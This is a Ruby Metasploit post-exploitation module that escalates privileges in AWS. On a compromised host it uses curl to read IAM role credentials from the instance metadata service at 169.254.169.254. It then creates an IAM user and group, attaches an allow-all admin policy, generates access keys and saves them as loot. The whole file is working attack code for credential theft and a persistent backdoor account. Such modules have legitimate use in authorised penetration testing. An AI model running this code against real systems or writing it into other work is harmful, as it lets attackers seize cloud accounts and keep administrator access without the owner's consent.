require 'msf/core'
require 'metasploit/framework/aws/client'

class MetasploitModule < Msf::Post

  include Metasploit::Framework::Aws::Client

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Create an AWS IAM User",
      'Description'    => %q{
        This module will attempt to create an AWS (Amazon Web Services) IAM
        (Identity and Access Management) user with Admin privileges.
      },
      'License'        => MSF_LICENSE,
      'Platform'      => %w(unix),
      'SessionTypes'  => %w(shell meterpreter),
      'Author'         => ['Javier Godinez <godinezj[at]gmail.com>'],
      'References'     => [
        [ 'URL', 'https://github.com/devsecops/bootcamp/raw/master/Week-6/slides/june-DSO-bootcamp-week-six-lesson-three.pdf' ]
      ]
    ))

    register_options(
      [
        OptString.new('RHOST', [true, 'AWS IAM Endpoint', 'iam.amazonaws.com']),
        OptString.new('RPORT', [true, 'AWS IAM Endpoint TCP Port', 443]),
        OptString.new('SSL', [true, 'AWS IAM Endpoint SSL', true]),
        OptString.new('IAM_GROUP_POL', [true, 'IAM group policy to use', '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*" }]}']),
        OptString.new('IAM_USERNAME', [true, 'Username for the user to be created', 'metasploit']),
        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
      ])
    register_advanced_options(
      [
        OptString.new('METADATA_IP', [true, 'The metadata service IP', '169.254.169.254']),
        OptString.new('AccessKeyId', [false, 'AWS access key', '']),
        OptString.new('SecretAccessKey', [false, 'AWS secret key', '']),
        OptString.new('Token', [false, 'AWS session token', ''])
      ])
    deregister_options('VHOST')
  end


  def run
    # setup creds for making IAM API calls
    creds = metadata_creds
    if datastore['AccessKeyId'].empty?
      if creds['AccessKeyId'].empty?
        print_error("Could not find creds")
        return
      end
    else
      creds = {
        'AccessKeyId' => datastore['AccessKeyId'],
        'SecretAccessKey' => datastore['SecretAccessKey'],
        'Token' => datastore['Token']
      }
    end

    # create user
    username = datastore['IAM_USERNAME']
    print_status("Creating user: #{username}")
    action = 'CreateUser'
    doc = call_iam(creds, 'Action' => action, 'UserName' => username)
    print_results(doc, action)

    # create group
    print_status("Creating group: #{username}")
    action = 'CreateGroup'
    doc = call_iam(creds, 'Action' => action, 'GroupName' => username)
    print_results(doc, action)

    # create group policy
    print_status("Creating group policy: #{username}")
    pol_doc = datastore['IAM_GROUP_POL']
    action = 'PutGroupPolicy'
    doc = call_iam(creds, 'Action' => action, 'GroupName' => username, 'PolicyName' => username, 'PolicyDocument' => URI.encode(pol_doc))
    print_results(doc, action)

    # add user to group
    print_status("Adding user (#{username}) to group: #{username}")
    action = 'AddUserToGroup'
    doc = call_iam(creds, 'Action' => action, 'UserName' => username, 'GroupName' => username)
    print_results(doc, action)

    # create API keys
    print_status("Creating API Keys for #{username}")
    action = 'CreateAccessKey'
    doc = call_iam(creds, 'Action' => action, 'UserName' => username)
    doc = print_results(doc, action)

    return if doc.nil?
    path = store_loot(doc['AccessKeyId'], 'text/plain', datastore['RHOST'], doc.to_json)
    print_good("API keys stored at: " + path)
  end

  def metadata_creds
    # TODO: do it for windows/generic way
    cmd_out = cmd_exec("curl --version")
    if cmd_out =~ /^curl \d/
      url = "http://#{datastore['METADATA_IP']}/2012-01-12/meta-data/"
      print_status("#{datastore['METADATA_IP']} - looking for creds...")
      resp = cmd_exec("curl #{url}")
      if resp =~ /^iam.*/
        resp = cmd_exec("curl #{url}iam/")
        if resp =~ /^security-credentials.*/
          resp = cmd_exec("curl #{url}iam/security-credentials/")
          json_out = cmd_exec("curl #{url}iam/security-credentials/#{resp}")
          begin
            return JSON.parse(json_out)
          rescue JSON::ParserError
            print_error "Could not parse JSON output"
          end
        end
      end
    else
      print_error cmd_out
    end
    {}
  end
end

